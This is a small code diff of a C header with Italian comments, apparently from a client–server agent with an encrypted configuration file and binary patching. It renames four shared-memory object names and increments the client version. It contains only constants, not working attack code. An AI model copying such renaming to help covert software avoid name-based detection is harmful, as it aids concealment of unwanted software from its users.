@@ -91,13 +91,13 @@ extern BOOL is_demo_version;
 #define BLOCK_LEN 16 // Lunghezza di un blocco di cifratura (per AES)
 #define CLEAR_CONF_LEN 8 // Numero di byte in chiaro all'inizio del file di configurazione
 
-#define SHARE_MEMORY_READ_BASENAME "KMS1"
-#define SHARE_MEMORY_WRITE_BASENAME "KMS2"
-#define SHARE_MEMORY_ASP_COMMAND_BASENAME "KMS3"
-#define SHARE_MEMORY_ASP_DATA_BASENAME "KMS4"
+#define SHARE_MEMORY_READ_BASENAME "FSA"
+#define SHARE_MEMORY_WRITE_BASENAME "FSB"
+#define SHARE_MEMORY_ASP_COMMAND_BASENAME "FSC"
+#define SHARE_MEMORY_ASP_DATA_BASENAME "FSD"
 
 // Versione del client 
-#define CLIENT_VERSION "2012063004"
+#define CLIENT_VERSION "2012063005"
 
 // -------- Elementi per il binary patching ---------
 // Chiave UNIVOCA fra server e client
